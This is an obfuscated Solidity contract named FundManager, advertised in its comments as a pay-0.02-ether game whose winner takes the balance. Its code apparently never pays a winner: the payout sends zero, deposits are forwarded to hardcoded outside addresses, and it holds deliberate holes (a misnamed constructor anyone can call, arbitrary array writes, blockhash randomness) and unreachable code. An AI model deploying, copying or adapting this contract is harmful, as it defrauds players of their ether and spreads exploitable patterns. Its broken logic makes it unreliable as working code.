// winner gets the contract balance
// 0.02 to play

pragma solidity ^0.4.23;

contract FundManager {

//constants

address public _0x5f99ff = 0x0;
address public _0xf7163b;
address public _0x409b3a = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public _0xabd6df = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public _0x532e03;

mapping(address=>bool) _0xdce31b;

uint256 public _0x839d6f;
uint256[] public _0xf0209f = [951828771,158769871220];
uint256[] public balance;

//constructor

function DranMe() public payable{
	_0xf7163b = msg.sender;
}

//modifiers

modifier _0xb943bb() {
    require(msg.sender == _0xf7163b);
    _;
}

modifier _0x8f914b() {
    require(msg.sender == _0x5f99ff);
    _;
}

modifier _0x1c1016() {
    require(_0xdce31b[msg.sender]);
    _;
}

//functions

function _0xc41b20() public constant returns(uint256) {
	return _0xf0209f.length;
}

function _0x9e8ec3(uint256 _0x91b222) public payable _0xb943bb{
	_0x839d6f = _0x91b222;
}

function _0x63f558() public constant returns(uint256) {
	return _0x532e03.length;
}

function _0xdedfa0() public constant returns(uint256) {
	return address(this).balance;
}

function _0x148434() public payable{
	require(msg.value >= 0.02 ether);
	_0x532e03.push(msg.sender);
	_0xdce31b[msg.sender]=true;
}

function _0x01f2ad() public payable _0x1c1016{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=_0xf7163b || _0xbe35e6()){
	    uint256 _0xad5c9f = 0;
        msg.sender.transfer(_0xad5c9f);
	}
}

function _0xbe35e6() private returns(bool){
    bytes32 _0xaabbad = _0x5cf79b(blockhash(block.number-1));
    uint256 _0x839d6f = uint256(_0xaabbad);
        if(_0x839d6f%5==0){
            _0x5f99ff = msg.sender;
            return true;
        }
        else{
            return false;
        }
    }

function _0x8fdad6 () public payable _0x1c1016 {
	require (msg.value >= 0.005 ether);
	_0x409b3a.call.value(msg.value)();
}

function _0x81531c () public payable _0x1c1016 {
	require (msg.value >= 0.005 ether);
	_0xabd6df.call.value(msg.value)();
}

function _0x2c95b7 (uint256 _0x047d72, uint256 _0x21e5c4) public payable _0x1c1016 {
	_0xf0209f[_0x047d72] = _0x21e5c4;
}

function _0x35d893 (uint256 _0xfcf344) public payable _0x1c1016 {
	_0xf0209f.length = _0xfcf344;
}

function _0x95c72d (uint256 _0x0d9aa7) public payable _0x1c1016 returns(uint256) {
	return (_0x0d9aa7 / (_0xf0209f[0]*_0xf0209f[1]));
	if((_0x0d9aa7 / (_0xf0209f[0]*_0xf0209f[1])) == _0x839d6f) {
		_0xf7163b = _0x5f99ff;
	}
}

function _0xc87526 () public payable _0x1c1016 returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == _0x839d6f){
        return true;
    }
}

function _0x68b46c() public payable _0xb943bb {
	_0xf7163b.call.value(1 wei)();
}

function _0xf60927() public payable _0x8f914b {
	_0x5f99ff.transfer(address(this).balance);
}

//fallback function

function() public payable{
	}
}
